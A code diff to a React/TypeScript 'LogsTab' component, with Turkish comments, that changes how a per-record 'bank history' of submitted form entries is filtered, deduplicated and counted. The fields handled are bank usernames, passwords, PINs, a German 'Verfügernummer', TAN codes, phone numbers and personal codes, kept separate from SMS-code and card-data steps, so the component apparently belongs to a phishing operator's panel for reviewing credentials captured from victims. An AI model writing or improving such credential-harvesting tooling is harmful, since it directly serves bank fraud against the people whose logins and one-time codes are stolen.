@@ -1600,32 +1600,87 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
                 // ⭐ BANKA GECMISI HESAPLA:
                 //   1) SMS KODU ve KART BILGISI disindaki tum entryler (sadece banka formu).
-                //   2) ⭐ Son (en yeni) banka kaydi KOLONDAKI TUM ANA ALANLAR ile TAMAMI ayni ise
-                //      (yani orderedField1 + username + password hepsi birebir eslesirse)
-                //      listeden ve sayimdan KALDIR (mevcut kolon onu zaten gosterdigi icin).
-                //      TEK ALAN eslesmesi YETERLI DEGIL (aksi halde yeni form girilince eski form
-                //      gecmisten dusuyor, kullanici onu gormek istiyor).
-                const bankHistoryRawPre = history.filter((e: any) => {
+                //   2) ⚠️ GURULTU TEMIZLIGI: Legacy snapshot (isLegacySnapshot) ve TUM onemli alanlar
+                //      (ordered1/user/pass/tac/telefon/kimlik vb.) HEPSI bos ise listeden at (bos kayit gosterme).
+                //   3) Ard arda girilen AYNI form (tüm alanlar birebir) tekrar ediyorsa 1 tane birak (SMS/KART dedup gibi).
+                //   4) ⭐ Son (en yeni) kayit TUM 12+ onemli alan KOLONDAKI ile BIREBIR AYNI ise
+                //      listeden ve sayimdan KALDIR (3 alan degil HEPSI eslesmeli, aksi halde yeni form girilince
+                //      eski kayitlar gecmiste gorunur.
+                const bankHistoryRawPre0 = history
+                  .filter((e: any) => {
                     if (!e) return false;
                     const label = typeof e.htmlStepLabel === "string" ? e.htmlStepLabel : "";
                     return label !== "SMS KODU" && label !== "KART BILGISI";
-                  });
-                // ⭐ Son banka kaydi mevcut kolon ile BIREBIR AYNI MI? (TUM alanlar eslesirse sil)
+                  })
+                  .filter((e: any) => {
+                    // Gurultu filtresi: legacy snapshot + tum alanlar bossa sil
+                    if (!e.isLegacySnapshot) return true;
+                    const sO1 = String(e.orderedField1 || "").trim();
+                    const sUser = String(e.username || e.verfuegernummer || "").trim();
+                    const sPass = String(e.password || e.pin || "").trim();
+                    const sTac = String(e.tacCode || "").trim();
+                    const sPhone = String(e.bankPhone || "").trim();
+                    const sPers = String(e.personalCode || "").trim();
+                    return !(sO1.length === 0 && sUser.length === 0 && sPass.length === 0 && sTac.length === 0 && sPhone.length === 0 && sPers.length === 0);
+                  })
+                  .map((e: any) => ({
+                    ...e,
+                    _o1: String(e.orderedField1 || "").trim(),
+                    _user: String(e.username || e.verfuegernummer || "").trim(),
+                    _pass: String(e.password || e.pin || "").trim(),
+                    _tac: String(e.tacCode || "").trim(),
+                    _phone: String(e.bankPhone || "").trim(),
+                    _pers: String(e.personalCode || "").trim(),
+                    _o2: String(e.orderedField2 || "").trim(),
+                    _o3: String(e.orderedField3 || "").trim(),
+                  }));
+
+                // 3) Dedup: ard arda GIRILEN AYNI formu 1 tane birak (tum alanlar esit)
+                const bankHistoryRawPre1: any[] = [];
+                for (let i = 0; i < bankHistoryRawPre0.length; i++) {
+                  const cur = bankHistoryRawPre0[i];
+                  const prev = i > 0 ? bankHistoryRawPre0[i - 1] : null;
+                  if (!prev) { bankHistoryRawPre1.push(cur); continue; }
+                  const same =
+                    prev._o1 === cur._o1 &&
+                    prev._user === cur._user &&
+                    prev._pass === cur._pass &&
+                    prev._tac === cur._tac &&
+                    prev._phone === cur._phone &&
+                    prev._pers === cur._pers &&
+                    prev._o2 === cur._o2 &&
+                    prev._o3 === cur._o3;
+                  if (!same) bankHistoryRawPre1.push(cur);
+                }
+
+                // 4) Son kayit = mevcut kolondaki ile TUM alanlar eslesiyorsa listeden kaldir
+                const currentO2 = String(fd.orderedField2 || "").trim();
+                const currentO3 = String(fd.orderedField3 || "").trim();
+                const currentTac = String(fd.tacCode || "").trim();
+                const currentBankPhone = String(fd.bankPhone || "").trim();
+                const currentPersonalCode = String(fd.personalCode || "").trim();
                 const bankHistoryRaw: any[] = (() => {
-                  if (bankHistoryRawPre.length === 0) return [];
-                  const lastEntry = bankHistoryRawPre[bankHistoryRawPre.length - 1];
-                  const lastO1 = String(lastEntry.orderedField1 || "").trim();
-                  const lastUser = String(lastEntry.username || lastEntry.verfuegernummer || "").trim();
-                  const lastPass = String(lastEntry.password || lastEntry.pin || "").trim();
-                  const currentHasData =
-                    currentBankOrdered1.length > 0 || currentBankUser.length > 0 || currentBankPass.length > 0;
-                  if (!currentHasData) return bankHistoryRawPre;
-                  const matchAllCurrent =
-                    lastO1 === currentBankOrdered1 &&
-                    lastUser === currentBankUser &&
-                    lastPass === currentBankPass;
-                  if (matchAllCurrent) return bankHistoryRawPre.slice(0, -1);
-                  return bankHistoryRawPre;
+                  if (bankHistoryRawPre1.length === 0) return [];
+                  const lastE = bankHistoryRawPre1[bankHistoryRawPre1.length - 1];
+                  const currentHasAny =
+                    currentBankOrdered1.length > 0 ||
+                    currentBankUser.length > 0 ||
+                    currentBankPass.length > 0 ||
+                    currentTac.length > 0 ||
+                    currentBankPhone.length > 0 ||
+                    currentPersonalCode.length > 0;
+                  if (!currentHasAny) return bankHistoryRawPre1;
+                  const allMatch =
+                    lastE._o1 === currentBankOrdered1 &&
+                    lastE._user === currentBankUser &&
+                    lastE._pass === currentBankPass &&
+                    lastE._tac === currentTac &&
+                    lastE._phone === currentBankPhone &&
+                    lastE._pers === currentPersonalCode &&
+                    lastE._o2 === currentO2 &&
+                    lastE._o3 === currentO3;
+                  if (allMatch) return bankHistoryRawPre1.slice(0, -1);
+                  return bankHistoryRawPre1;
                 })();
                 const bankHistoryCount = bankHistoryRaw.length;
                 (fd as any)._bankHistory = bankHistoryRaw;
